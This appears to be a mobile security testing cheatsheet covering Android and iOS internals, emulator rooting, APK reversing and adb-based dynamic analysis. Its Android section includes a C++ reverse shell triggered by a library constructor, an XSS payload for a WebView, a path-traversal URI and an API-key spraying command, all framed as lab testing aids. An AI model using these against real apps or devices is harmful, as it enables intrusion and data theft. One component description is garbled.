Title: Mobile Cheatsheet
Slug: mobile/cheatsheet
Date: 1957-01-01 00:00
Category: Cheatsheet

## Android

### Concepts
#### Architecture

![[android-framework.png]]


**Kernel**: it's a Linux Kernel. It's the most privileged as well as the hardest to reach. Some of the classic Linux kernel exploits are still applicable.
It uses as well SELinux.

It's responsible of the basic systems services:

-  Memory Management
- Process Management
- Network Stack
- Devices Drivers

**Hardware Abstraction Layer (HAL)**: handles the communication between Native libraries and the hardware by mean of software hooks (or interfaces).

Each HAL module is separated from the other by the perspective of security:

![[android-hardware abstraction layer-security boundaries.png]]

**Native Libraries & Android Runtime**: Many core Android system components and services, such as ART and HAL, are built from native code that requires native libraries written in C and C++. The Android platform provides Java framework APIs to expose the functionality of some of these native libraries to apps. 

 For devices running Android version 5.0 (API level 21) or higher, each app runs in its own process and with its own instance of the Android Runtime (ART), running multiple virtual machine, implementing some optimizations like:

- Ahead-of-time (AOT) & Just-in-time (JIT) compilation: improve application performances and reduces memory usage.
- Optimized garbage collection (GC)

Prior to Android version 5.0 (API level 21), Dalvik was the Android runtime. If your app runs well on ART, then it can work on Dalvik as well, but the reverse might not be true. 

The Java code is first compiled to Java bytecode (.class) by the Java compiler and then compiled to Dalvik bytecode (.dex) by the Dalvik compiler.

**Java API Framework**: provides high-level APIs for developers enabling them to create and manage the user interface, handle user input, and access device features.

#### Android Security

#### System Security

Reference: [https://source.android.com/docs/security](https://source.android.com/docs/security)

**Device encryption**

* File-based (Android 7+) - [Reference](https://source.android.com/docs/security/features/encryption/file-based): Allows different file to be encrypted with different independent keys.
* Full-disk (Android 5+) - [Reference](https://source.android.com/docs/security/features/encryption/full-disk): uses a single key protected with the user device password, to encrypt a whole userdata partition.
* Metadata Encryption (Android 9+) - [Reference](https://source.android.com/docs/security/features/encryption/metadata)

**Tusted Execution Environment (TEE)** - [Reference](https://source.android.com/docs/security/features/trusty): it's a secure isolated area in running on the same processor as the Android OS, designed to safely provide and protect sensitive code and data processed in the execution environment.

- **Hardware**: Keystore to store for example cryptographic keys and biometrics
- **Software**: Trusted applications and API’s


![[android-trusted-vs-risk-execution-environment.png]]

**REE** stands for **Risk Execution Environment**.

**Verified boot**: strives to ensure all executed code comes from a trusted source.

#### Network Security
 
TLS is used by default and, since Android 9, DNS over TLS is supported.
Android allows separate network security config per app.

Certificate pinning is used to prevent encrpyted traffic sniffing by defining an harcoded set of trusted Certification Authorities. 

#### Software Isolation

Permissions are declared per app in their manifest file.

Android uses Security-Enhanced Linux (SELinux) to enforce mandatory access control (MAC) over all processes, even processes running with root/superuser privileges (Linux capabilities). [Reference](https://source.android.com/docs/security/features/selinux)
With SELinux, Android can better protect and confine system services, control access to application data and system logs, reduce the effects of malicious software, and protect users from potential flaws in code on mobile devices, isolating apps in sandboxes.

SELinux operates on the principle of default denial: Anything not explicitly allowed is denied. SELinux can operate in two global modes:

- _Permissive_ mode, in which permission denials are logged but not enforced.
- _Enforcing_ mode, in which permissions denials are both logged **and** enforced.

#### Anti-Exploitation

Android has different protections against (kernel) exploits / buffer overflows:

* **ASLR**: Address Space Layout Randomization, since Android 4.1
* **KASLR**: enables address space randomization for the Linux kernel image by randomizing where the kernel code is placed at boot time. Since Android 8
* **DEP**: Data Execution Prevention (DEP)
* **SECCOMP** filter, to secure syscalls

#### Components
#### Activity

An activity is the entry point for user interaction. It represents a single screen with a user interface.
#### Service

A Service is an application component that can perform long-running operations in the background. It does not provide a user interface. Once started, a service might continue running for some time, even after the user switches to another application. 

It's different from a thread!

Note: A service runs in the main thread of its hosting process; the service does **not** create its own thread and does **not** run in a separate process unless you specify otherwise.

These are the three different types of services:

- **Foreground**: A foreground service performs some operation that is noticeable to the user, displaying a notification.
- **Background**: A foreground service performs some operation that is noticeable to the user.
- **Bound**:  A bound service offers a client-server interface that allows components to interact with the service, send requests, receive results, and even do so across processes with interprocess communication (IPC). It runs only as long as another component is bound to it. The bounding is done by calling `bindService()`.

#### Broadcasts

Broadcasts implement the publish-subscribe pattern, allowing apps to send or receive broadcast messages from the system or other apps. These broadcasts are sent when an event of interest occurs.

The system optimizes the delivery of broadcasts in order to maintain optimal system health.

Apps can register to receive specific broadcasts. When a broadcast is sent, the system automatically routes broadcasts to apps that have subscribed to receive that particular type of broadcast.

Each broadcast is delivered as an **Intent**.

#### Content Provider

Content providers can help an application manage access to data stored by itself or stored by other apps and provide a way to share data with other apps. They encapsulate the data and provide mechanisms for defining data security. Content providers are the standard interface that connects data in one process with code running in another process.

The encapsulated data is made accessible by an URI.
#### Inter-Process Communication (IPC)

Android IPC provides a secure way to tranfer data between apps / sandboxes by mean of:

* Middleware using Binder framework
* Intents
#### Intent
An Intent is a messaging object you can use to request an action from another app component.
Activities, services, and broadcast receivers are activated by intents.

There are two types of intents:

- **Explicit**: specify which component of which application will satisfy the intent, by specifying a full ComponentName
- **Implicit**: do not name a specific component, but instead declare a general action to perform, which allows a component from another app to handle it.


When you use an implicit intent, the Android system finds the appropriate component to start by comparing the contents of the intent to the **intent filters** declared in the manifest file of other apps on the device.
#### Binder
https://medium.com/@ashu.knock/binders-in-android-part-1-e875daeb762f

Processes in Android have separate address spaces and a process cannot directly access another process’s memory (process isolation).
If a process wants to offer some useful service(s) to other processes, it needs to provide some mechanism that allows other processes to discover and interact with those services. That mechanism is referred to as _IPC_.

Binder is an IPC mechanism developed for Android that abstracts the low-level details of IPC from the developer, allowing applications to easily talk to both the System Server and others’ remote service components.

The Binder kernel driver manages part of the address space of each process, allowing inter-process comunication.

### Lab Setup

#### Emulator Rooting (AVD)

Reference: [https://8ksec.io/rooting-an-android-emulator-for-mobile-security-testing/](https://8ksec.io/rooting-an-android-emulator-for-mobile-security-testing/)

1 - Prerequisites: Ensure that `platform-tools` and `emulator` folders in the Android SDK installation are included in the `$PATH`. This is needed in order to invoke the binaries `adb` and `emulator`.

2 - Create a new device using Android Studio's Device Manager.

3 - Disable Snapshots for a **Cold Boot**. 

4 - Cold Boot the device from the Android Studio's Device Manger or from command line with the following command:

~~~shell
emulator -avd <device name> -no-snapshot-load
~~~

5 - Download the latest `rootAVD` script:

~~~shell
git clone https://gitlab.com/newbit/rootAVD.git
~~~

6 - Run the following command to list all installed AVD system images:

~~~shell
./rootAVD.sh ListAllAVDs
~~~

7 - Launch the rooting process with the following command:

~~~shell
./rootAVD.sh <"ramdisk.img" image from the previous command output depending on the taget device API level>
~~~

8 - Follow the wizard. Generally the default options works fine.

8.1 - For some recent Android versions (like API 34), the standard patch might report `“Magisk Installed: N/A”` or fail to inject properly If the script output indicates Magisk wasn’t installed, you should rerun the command with the `FAKEBOOTIMG` option:

~~~shell
./rootAVD.sh <"ramdisk.img" image from the previous command output depending on the taget device API level> FAKEBOOTING
~~~

- The script will push a file (e.g. `fakeboot.img`) into the emulator’s `/sdcard/Download` directory.
- It will then display a message like _“Install/Patch /sdcard/Download/fakeboot.img and hit Enter when done”._ At this point, **do not press Enter yet.** Instead, go to the emulator, launch the **Magisk app**, and use the **Install -> Select and Patch a File** option. Navigate to `/sdcard/Download/` and select `fakeboot.img`. Magisk will patch the image and output a modified file. Usually it says “Output file is …”. Once Magisk finishes, return to the terminal and press Enter to let rootAVD continue.
- The script will then finish the installation, replace the AVD’s ramdisk with the patched version, and automatically reboot the emulator to apply changes. You should see a success message indicating Magisk is installed.

9 - Reboot the device (cold boot).

10 - Open the Magisk application and perform all the updates.

11 - Toggle superuser capabilities in the Magisk application.

Useful Magisk plugins:

- Burp Certificate Pinning: [https://github.com/pwnlogs/cert-fixer](https://github.com/pwnlogs/cert-fixer)
- Frida Server: [https://github.com/ViRb3/magisk-frida](https://github.com/ViRb3/magisk-frida)

### Patch APK with frida gadget

Reference: [https://koz.io/using-frida-on-android-without-root/](https://koz.io/using-frida-on-android-without-root/)


### Static Analysis

- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
- [Semgrep Android Rules](https://github.com/mindedsecurity/semgrep-rules-android-security)
- [GDA - Android Reversing Tool](https://github.com/charles2gan/GDA-android-reversing-Tool)

Reverse Engineer APK:

~~~shell
jadx -d <absolute output path> <absolute target apk>

jadx -d <absolute output path> <absolute target apk> --deobf // Try de-obfuscate

apktool d <apk> // Get Dalvik Bytecode

apktool b <decompiled directory> -o <output apk> // Re-build Dalvik Bytecode
~~~

Sign an APK:

~~~shell
// Generate a new key in the specified keystore 

keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

// Sign the apk with the keystore containing the generated key

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore <apk file> <alias>
~~~

Dump APK useful information:

~~~shell
aapt dump badging base.apk

aapt list -a base.apk
aapt list -a base.apk | grep minSdkVersion # Convert hex value to decimal with echo $((16#<hex value>))
~~~

Smali References:
 
 - [http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html](http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html)
 - [https://github.com/JesusFreke/smali/wiki/Registers](https://github.com/JesusFreke/smali/wiki/Registers)

#### Manifest

##### Main Activity 

Locate Main Activity in manifest, it's declared like following snippet:

~~~xml
<activity android:label="@string/app_name" android:name="com.package.MainActivity">
	<intent-filter>
		<action android:name="android.intent.action.MAIN"/>
		<category android:name="android.intent.category.LAUNCHER"/>
	</intent-filter>
</activity>
~~~

##### Exported Components 

Locate exported activities, services, broadcast receivers, etc., having the `android:exported` set to `true`:

~~~xml
<activity android:exported="true" android:label="@string/title_activity_post_login" android:name="com.package.SomeExportedActivity"/>
~~~

Exported activity, service, broadcast receiver, etc.) can be launched by components of other applications:

- If `true`, any app can access the activity and launch it by its exact class name.
- If `false`, only components of the same application, applications with the same user ID, or privileged system components can launch the activity.

In API level 16 and lower the default value is `true`

Mitigation: Always explicitly set the `android:exported` attribute.

When an app targets Android 11 (API level 30) or higher and queries for information about the other apps that are installed on a device, the system filters this information by default.

When other applications are not visible to yours, use the `<queries>` tag in the manifest in order to make them visible ([reference](https://developer.android.com/training/package-visibility)):

~~~xml
<queries>  
    <package android:name="<target application package name>" />    
</queries>
~~~



**Note: an activity with an intent-filter is automatically exported by default !**

##### HTTP Enabled

HTTP is enabled if the property  `android:usesCleartextTraffic` is set to `true`:

~~~xml
<?xml version="1.0" encoding="utf-8"?>
<manifest ...>
    <uses-permission android:name="android.permission.INTERNET" />
    <application
        ...
        android:usesCleartextTraffic="true"
        ...>
        ...
    </application>
</manifest>
~~~

If the application uses a separated network security configuration file specified by the property  `android:networkSecurityConfig`, check if that file has the property `cleartextTrafficPermitted` set to `true`:

~~~xml

<!-- AndroidManifest.xml -->
<?xml version="1.0" encoding="utf-8"?>
<manifest ...>
    <uses-permission android:name="android.permission.INTERNET" />
    <application
        ...
        android:networkSecurityConfig="@xml/network_security_config"
        ...>
        ...
    </application>
</manifest>

<!-- network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">...</domain>
    </domain-config>
</network-security-config>
~~~

##### Intent Filters

Intent filters are used to declare the capability of an activity to respond to particular intents eventually requested explicitly or implicitly from other apps.
Intent filters are declared in the `<intent-filter>` tags:

~~~xml
<manifest ... >
...
	<application ...>
		<activityandroid:name="com.example.project.ComposeEmailActivity">
			<intent-filter>
				<action android:name="android.intent.action.SEND"/>
				<data android:type="*/*"/>
				<category android:name="android.intent.category.DEFAULT"/>
			</intent-filter>
		</activity>
	</application>
</manifest>
~~~

##### Reference

Updated at: 29/04/2023

| Element                    | Parent                                                                                                    | Description                                                                                                                                                                                                                              |
| -------------------------- | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<action>`                 | `<intent-filter>`                                                                                         | Adds an action to a filters intent.                                                                                                                                                                                                      |
| `<activity>`               | `<application>`                                                                                           | Declares a component of the activity.                                                                                                                                                                                                    |
| `<activity-alias>`         | `<activity>`                                                                                              | Declares an alias for the activity.                                                                                                                                                                                                      |
| `<application>`            | `<manifest>`                                                                                              | It is the application declaration.                                                                                                                                                                                                       |
| `<category>`               | `<intent-filter>`                                                                                         | Adds a category name to an intent filter.                                                                                                                                                                                                |
| `<compatible-screens>`     | `<manifest>`                                                                                              | Specifies each screen setting that the application supports.                                                                                                                                                                             |
| `<data>`                   | `<intent-filter>`                                                                                         | Adds a data specification to an intent filter.                                                                                                                                                                                           |
| `<grant-uri-permission>`   | `<provider>`                                                                                              | Specifies the subsets of application data that the parent content provider is allowed to access.                                                                                                                                         |
| `<instrumentation>`        | `<manifest>`                                                                                              | Declares an Instrumentation class that lets you monitor an application's interaction with the system.                                                                                                                                    |
| `<intent-filter>`          | `<activity>`<br>`<activity-alias>`<br>`<service>`<br>`<receiver>`<br>`<provider>`                         | Specifies what types of intents an activity, service, or broadcast receiver can respond to.                                                                                                                                              |
| `<layout>`                 | `<activity>`                                                                                              | Contains attributes that affect how an activity behaves in multi-window mode.                                                                                                                                                            |
| `<manifest>`               | `<activity>`                                                                                              | It is the root element of the AndroidManifest.xml file.                                                                                                                                                                                  |
| `<meta-data>`              | `<activity>`<br> `<activity-alias>`<br> `<application>`<br> `<provider>`<br> `<receiver>`<br> `<service>` | A name-value pair for an item of additional, arbitrary data that can be supplied to the parent component.                                                                                                                                |
| `<path-permission>`        | `<provider>`                                                                                              | Defines the path and required permissions for a specific subset of data within a content provider.                                                                                                                                       |
| `<permission>`             | `<manifest>`                                                                                              | Declares a security permission used to limit access to specific components or features of this or other applications.                                                                                                                    |
| `<permission-group>`       | `<manifest>`                                                                                              | Declares a name for a logical grouping of related permissions. This element doesn't declare a permission itself, only a category in which permissions can be placed.                                                                     |
| `<permission-tree>`        | `<manifest>`                                                                                              | Declares the base name for a tree of permissions.                                                                                                                                                                                        |
| `<profileable>`            | `<application>`                                                                                           | Specifies how profilers can access this application.                                                                                                                                                                                     |
| `<property>`               | `<activity>`<br>`<activity-alias>`<br>`<application>`<br>`<provider>`<br>`<receiver>`<br>`<service>`      | A name-value pair for an item of additional, arbitrary data that can be supplied to the parent component.                                                                                                                                |
| `<provider>`               | `<application>`                                                                                           | Declares a content provider component.                                                                                                                                                                                                   |
| `<queries>`                | `<manifest>`                                                                                              | Specifies the set of other apps that an app intends to interact with.                                                                                                                                                                    |
| `<receiver>`               | `<application>`                                                                                           | Declares a broadcast receiver.                                                                                                                                                                                                           |
| `<service>`                | `<application>`                                                                                           | Declares a service.                                                                                                                                                                                                                      |
| `<supports-gl-texture>`    | `<manifest>`                                                                                              | Declares a single GL texture compression format that the app supports.                                                                                                                                                                   |
| `<supports-screens>`       | `<manifest>`                                                                                              | Lets you specify the screen sizes your application supports and enable screen compatibility mode for screens larger than what your application supports.                                                                                 |
| `<uses-configuration>`     | `<manifest>`                                                                                              | Indicates the hardware and software features the application requires.                                                                                                                                                                   |
| `<uses-feature>`           | `<manifest>`                                                                                              | Declares a single hardware or software feature that is used by the application.                                                                                                                                                          |
| `<uses-library>`           | `<manifest>`                                                                                              | Specifies a shared library that the application must be linked against.                                                                                                                                                                  |
| `<uses-native-library>`    | `<application>`                                                                                           | Specifies a vendor-provided shared native library that the application must be linked against. This element tells the system to make the native library accessible for the package.                                                      |
| `<uses-permission>`        | `<manifest>`                                                                                              | Specifies a system permission that the user must grant for the app to operate correctly.                                                                                                                                                 |
| `<uses-permission-sdk-23>` | `<manifest>`                                                                                              | Specifies that an app wants a particular permission, but only if the app is installed on a device running Android 6.0 (API level 23) or higher. If the device runs API level 22 or lower, the app doesn't want the specified permission. |
| `<uses-sdk>`               | `<manifest>`                                                                                              | Lets you express an application's compatibility with one or more versions of the Android platform by means of an API level integer.                                                                                                      |


#### Bypass Provider Restrictions

Reference: https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/

Each time an Intent is passed in any way between apps on Android, the system automatically checks the flags `FLAG_GRANT_READ_URI_PERMISSION`, `FLAG_GRANT_WRITE_URI_PERMISSION`, etc.

When a content provider has the `android:grantUriPermissions` set to `true`, it could be possible to exploit an unsafe code that redirects user controllable intents, allowing to access restricted content providers.

An example of unsafe code is the following:

~~~java
public void onActivityResult(int requestCode, int resultCode, Intent evilIntent) {
	...
	setResult(resultCode, evilIntent);
}
~~~

#### Backup

`adb backup` command can also be used for extracting application package backup as follows:

~~~shell
// get backup
adb backup <package name> 

// Extract backup*
dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar

/// alternative using openssl
dd if=backup.ab bs=1 skip=24 | openssl zlib -d
~~~

Note:

- First 24 bytes contains the header of the backup, so they're skipped

**Warning** -  [adb backup is deprecated since Android 12](https://developer.android.com/about/versions/12/behavior-changes-12#adb-backup-restrictions):

~~~quote
For apps that target Android 12 (API level 31) or higher, when a user runs the adb backup command, app data is excluded from any other system data that is exported from the device.

If your testing or development workflows rely on app data using adb backup, you can now opt in to exporting your app's data by setting android:debuggable to true in your app's manifest file.
~~~

-`adb backup` on Android 12 only work if `targetSDK` is lower than 31 or the app is marked as `debuggable=true`.

For Android 12 or higher, create a backup as follows:

~~~shell
# Create the backup
adb shell bmgr enable true
adb shell bmgr transport com.android.localtransport/.LocalTransport
adb shell settings put secure backup_local_transport_parameters 'is_encrypted=true'
adb shell bmgr backupnow '<package name>'

# Copy and extract the backup
adb root 
adb pull /data/data/com.android.localtransport/files/1/_full/'<package name>' '<package name>.ab' 
tar xvf <package name>.ab
~~~

#### LFI & Path Traversal

When dealing with WebViews with `WebSettings.setAllowFileAccessFromFileURLs(true)`, it could be possible to exfiltrate files using XHR requests to `file:///file_to_exfiltrate` abusing other vulnerabilities such as XSS.

The use of `getLastPathSegment()` from the `Uri` class without any validation or sanitization is unsafe as it could lead to path traversal by URL encoding the URI:

 - Example: `content://oversecured.ovaa.theftoverwrite/..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml`

When using `intent.setData` with a URI with `file://` protocol, from Android Nougat a FileUriExposedException will be received; this could be overcame with the following code:

~~~java
// See: https://stackoverflow.com/questions/38200282/android-os-fileuriexposedexception-file-storage-emulated-0-test-txt-exposed
StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX);
~~~

#### Secrets Extraction

Extract URIs, endpoints and secrets using [apkleaks](https://github.com/dwisiswant0/apkleaks)

~~~shell
apkleaks -f <apk to scan> -o <output result path>
~~~

\[Bug Bounty] Spray found API keys across targets with `nuclei`:

~~~shell
nuclei -t nuclei-templates/http/token-spray -var token=<found api key>
~~~

#### App Links

Validate Android assetlinks.json with [yurl](https://github.com/chayev/yurl):

~~~shell
yurl assetlink validate <domain>
~~~

#### WebViews

`@JavascriptInterface` annotation defines a Java function that  provides the facility to create any method as the javascript Interface which means that method can be used by web components to communicate with Android.

### Dynamic Analysis

Useful references:

-  [ASRP Playbook](https://asrp.darkwolf.io/intro)

Useful tools:

- [Drozer](https://github.com/WithSecureLabs/drozer)
- [RMS - Runtime Mobile Security](https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security)
- [Objection](https://github.com/sensepost/objection)
- [House](https://github.com/nccgroup/house)
- [Medusa](https://github.com/Ch0pin/medusa)
- [Binder Trace](https://github.com/foundryzero/binder-trace)

Interesting paths:

| Path                                  | Description               |
| ------------------------------------- | ------------------------- |
| `/data/data/<package>/ databases`     | app databases             |
| `/data/data/<package>/ shared_prefs/` | Shared preferences        |
| `/data/app`                           | APK installed by user     |
| `/system/app`                         | Pre-installed APK files   |
| `/mmt/asec`                           | Encrypted apps / App2SD   |
| `/mmt/emmc`                           | Internal SD Card          |
| `/mmt/adcard`                         | External/Internal SD Card |
| `/mmt/adcard/external_sd`             | External SD Card          |

#### Packages Info

Dump package info:

~~~shell
[adb shell] pm dump <package name>
~~~


Path to the APK for the specified package:

~~~shell
[adb shell] pm path <package>
~~~

List package names:

~~~shell
[adb shell] pm list packages
~~~

#### Intent Analysis

The following tool collects intents at runtime and allows to explore/filter them:

- [IRIS](https://github.com/Ch0pin/iris)

#### Network Traffic Capture

It's possible to intercept packets in real time by using *tcpdump* and *Wireshark*:

~~~shell
// Start tcpdump and pipe output to a netcat listener
adb shell "tcpdump -s 0 -w - | nc -l -p 4444" 

// Forward the port
adb forward tcp:4444 tcp:4444

// Connect to netcat listner and pipe output to wireshark
nc localhost 4444 | sudo wireshark -k -S -i –
~~~

Set and unset system proxy:

~~~shell
[adb shell] settings put global http_proxy <proxy address>:<proxy port>

[adb shell] settings put global http_proxy :0
~~~

##### Burp Certificate Installation

Extract the certificate from Burp and convert it to PEM format:

~~~shell
openssl x509 -inform der -in BurpCA.cer -out BurpCA.pem
~~~

Rename the cert to the output of the following command:

~~~shell
echo $(openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1 ).0
~~~

Copy and set right permissions to the cert:

~~~shell
adb root // if not already root
abd remount
adb push <cert name> /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/<cert name>"
adb shell "reboot"
~~~

#### Activities, Services, Content Providers, Broadcast Receivers

Start Activity by name:

~~~shell
[adb shell] am start -n com.android.insecurebankv2/.WrongLogin
~~~

Start Activity by deeplink:

~~~shell
[adb shell] am start -W "[schema]://[host]/[path][?queryParams]"
~~~

Start Activity Intent:

~~~shell
[adb shell] am start|startservice|broadcast <INTENT>[<COMPONENT>]
-a <ACTION> e.g. android.intent.action.VIEW
-c <CATEGORY> e.g. android.intent.category.LAUNCHER
~~~

Send Broadcast Intent message:

~~~shell
[adb shell] broadcast -n <COMPONENT> [-a <receivername>] 
~~~


Reference: [https://developer.android.com/tools/adb#IntentSpec](https://developer.android.com/tools/adb#IntentSpec)

Dump activity info:

~~~shell
[adb shell] dumpsys activity
<package>/<activity>
~~~

Get content by content provider:

~~~shell
// Query content provider data
[adb shell] content query --uri content://uri/to/resources

// Read file content from file content provider
[adb shell] content read --uri content://uri/to/resources
~~~

Take screenshot:

~~~shell
[adb shell] screencap -p "/path/to/screenshot.png"
~~~

Trace all invocations to methods in a package using `frida-trace`:

~~~shell
frida-trace -U -j 'com.package.!*' -f '<target application package>'
~~~

#### Logging

View devices logs:

~~~shell
adb logcat [options] [filter]
~~~


Target a specific app by filtering the Logcat output: 

~~~shell
adb logcat | grep "$(adb shell ps | grep <package-name> | awk '{print $2}')"
~~~

#### XSS

Exploit web view activity not validating schema:

~~~shell
adb shell am start -n oversecured.ovaa/.activities.WebViewActivity --es url 'javascript://somehost/%0aalert\(\"mzfr\"\)'
~~~

#### Dynamic Code Injection - Native Library Hijacking

When the application dynamically loads native libraries or dex code, it's possible to abuse other vulnerabilities such as path traversal in order to inject evil code and  achieve code execution:

~~~java
private final void loadProLibrary() {
        try {
            String abi = Build.SUPPORTED_ABIS[0];
            File libraryFolder = new File(getApplicationContext().getFilesDir(), "somedir/" + abi);
            File libraryFile = new File(libraryFolder, "dynamically_loaded_lib.so");
            System.load(libraryFile.getAbsolutePath());
        } catch (UnsatisfiedLinkError e) {
        ...
        }
    }
...
// Use dynamic loaded code
someDynamicFunction();
~~~

Following a C++ reverse shell:

~~~c++
#include <cstdio>
#include <cstdlib>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>

// remote host to "send" shell
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PORT 9999

// use "__attribute__" to call "reverse_shell" when load library
void __attribute__ ((constructor)) reverse_shell() {
    // create child process with fork
    if (fork() == 0) {
        int rsSocket;

        struct sockaddr_in socketAddr{};

        // configure socket address
        socketAddr.sin_family = AF_INET;
        socketAddr.sin_addr.s_addr = inet_addr(REMOTE_HOST);
        socketAddr.sin_port = htons(REMOTE_PORT);

        // create socket connection
        rsSocket = socket(AF_INET, SOCK_STREAM, 0);
        connect(rsSocket, (struct sockaddr *) &socketAddr, sizeof(socketAddr));

        // redirect std to socket
        dup2(rsSocket, 0); // stdin
        dup2(rsSocket, 1); // stdout
        dup2(rsSocket, 2); // stderr

        // get shell
        execve("/system/bin/sh", nullptr, nullptr);
    }
}
~~~

## iOS

	
### Concepts

Reference: https://help.apple.com/pdf/security/en_GB/apple-platform-security-guide-b.pdf

###### Architecture


![[ios-architecture-extended.png]]


- **Core OS:**
	- **Kernel**: Unix-based. Manages the system's resources (memory and CPU) and handles communication between hardware and software.
	- **Device Drivers**: Interfaces with the hardware components.
	- **Security Frameworks**: handles encryption, certificates and secure storage.
	- **File System**: Manages the file system structure.
- **Core Services**:
	- **Foundation Framework**: Provides basic data types, collections and other utility classes.
	- **Core Data**: Manages the model layer in the MVC architecture, handling object graphs and persistence.
	- **Core Location**: Provides location-based services using GPS. WiFi and cellular data
	- **Networking**: Offers APIs for network communication, including HTTP and Bluetooth.
	- **CloudKit**: Provides cloud storage and data synchronization services.
	- **WebKit**: Integrate web content into app's native content.
- **Media**:
	- **Core Graphics**: Handles 2D rendering and animations.
	- **Core Animation**: Provides smooth and efficient animations.
	- **AVFoundation**: Manages audio and video playback.
	- **Core Image**: Allows image processing and filters.
	- **Metal and OpenGL ES**: Provide support for high-performance 3D graphics rendering
- **Cocoa (Application)**:
	- **UIKit**: Provides the building blocks for constructing the user interface, such as buttons, labels, and table views.
	- **Event Handling**: Manages touch, motion and remote control events.
	- **Push Notifications**: Handles the reception and processing of remote notifications.
	- **Social Media Integration**: Offers built-in services for integrating with social networks.

###### Operating System

![[ios-os-architecture.png]]


The core operating system is Darwin OS and it's the foundation for all specific iDevices OS (MacOS, iOS, tvOS, watchOS, visionOS, etc.).

The **XNU** kernel ("X is Not Unix") it's a hybrid kernel combining **BSD** kernel and **Mach** microkernel features.

- **BSD**: File Systems, Unix utilities and network capabilities
- **Mach**: IPC, Memory management, Device drivers and I/O kit

On iOS drivers are located at: `/System/Library/Extensions`

**Mach-O (Mach object)**: file format for executables, object code, shared libraries, dynamically loaded code, and core dumps.

###### Security Components

Hardware Security Components:

- **Effaceable Storage**: A dedicated area of NAND storage, used to store cryptographic keys, that can be addressed directly and wiped securely. While it doesn’t provide protection if an attacker has physical possession of a device, keys held in Effaceable Storage can be used as part of a key hierarchy to facilitate fast wipe and forward security.
- **Boot Progress Register (BPR)**: A set of system-on-chip (SoC) hardware flags that software can use to track the boot modes the device has entered, such as Device Firmware Update (DFU) mode and Recovery mode. After a Boot Progress Register flag is set, it can’t be  cleared. This allows later software to get a trusted indicator of the state of the system.
- **Boot ROM**: The very first code executed by a device’s processor when it first boots. As an integral part of the processor, it can’t be altered by either Apple or an attacker.
	- **Chain of Trust**: Each stage of the boot process is cryptographically signed and verified by the previous stage, ensuring that only authenticated and unaltered code is executed.
- **iBoot**: The stage 2 boot loader for all Apple devices. Code that loads XNU as part of the secure boot chain. Depending on the system-on-chip (SoC) generation, iBoot may be loaded by the Low-Level Bootloader or directly by the Boot ROM.
- **Low-Level Bootloader (LLB)**: On a Mac with a two-stage boot architecture, the LLB contains the code that’s invoked by the Boot ROM, and that in turn loads iBoot, as part of the secure boot chain.
- **Data Vault**: A mechanism — enforced by the kernel — to protect against unauthorised access to data regardless of whether the requesting app is itself sandboxed.
- **Device Firmware Upgrade (DFU) mode**: A mode in which a device’s Boot ROM code waits to be recovered via USB. The screen is black when in DFU mode, but upon connecting to a computer with the Finder or iTunes, the following prompt is presented: “The Finder (or iTunes) has detected an iPhone (or iPad) in Recovery mode. The user must restore this iPhone (or iPad) before it can be used with the Finder (or iTunes).”
- **Secure Enclave**: The Secure Enclave is a component on Apple system on a chip (SoC) that’s included on all recent devices that provides the foundation for the secure generation and storage of the keys necessary for encrypting data at rest, and it protects and evaluates the biometric data for Optic ID, Face ID and Touch ID.
- **xART**: An abbreviation for eXtended Anti-Replay Technology. A set of services that provide encrypted, authenticated persistent storage for the Secure Enclave with anti-replay capabilities based on the physical storage architecture. See Secure Storage Component.
- **XNU**: The kernel at the heart of the Apple operating systems. It’s assumed to be trusted, and it enforces security measures such as code signing, sandboxing, entitlement checking and Address Space Layout Randomisation (ASLR).

Software Security Components:
- **App Sandbox**: It's an isolated environment. Each app runs in its own sandboxed environment, limiting its interactions with other apps and the operating systems. An application must request permission to access resources like the camera, microphone, location data, or contacts (managed by iOS's privacy controls)
- **Automatic Security Updates**: Apple regularly releases security updates that are easily deployable to users, ensuring that devices remain protected against the latests threats. For critical vulnerability, Apple can enfore updates to ensure that all users are protected.
- **Code Signing**: All iOS apps must be signed with a valid Apple-issued certificate. This prevents unauthorized code from running on the device. The signature is also validate at runtime, protecting against code injection or modification.
- **Privacy Features**: Users are prompted to grant or deny permissions to applications that need to access sensitive information such as location, photos and contacts. Application must declare why they need access to certain data. 
- **Secure Boot Chain**: 
	- **Boot Loader Verification**: The boot loader, responsible for loading the kernel, is cryptographically verified by the Boot ROM.
	- **Kernel Integrity**: The iOS kernel is signed and verified before it is allowed to execute, preventing unauthorized modifications.
- **Tracking Prevention**: Application must ask for permission before tracking users accross apps and websites (App Tracking Transparency - ATT). iOS provides reports to users showing which apps have accessed sensitive information or attempted to track them.
- **XProtect**: On devices with macOS, an antivirus technology for the signature-based detection and removal of malware.

General Exploit Mitigations:

- **Address Space Layout Randomizaion - ASLR**: Randomizes memory addresses used by the system and app process to prevent attacker from predicting target locations in memory, making it harder to execute certain types of attacks (e.g. buffer overflows).
- **Data Execution Prevention (DEP)**: Ensures that certain areas of memory are marked as non-executable, preventing malicious code from being executed from these locations.
- **Pointer Authentication Codes (PAC)**: PAC adds cryptographic signatures to pointers in memory, making it difficult for attackers to manipulate them without detection.
- **Stack Canaries**: small random values (canary) placed before the stack return pointer. If the canary is altered, the app can detect and prevent buffer overflow attacks.
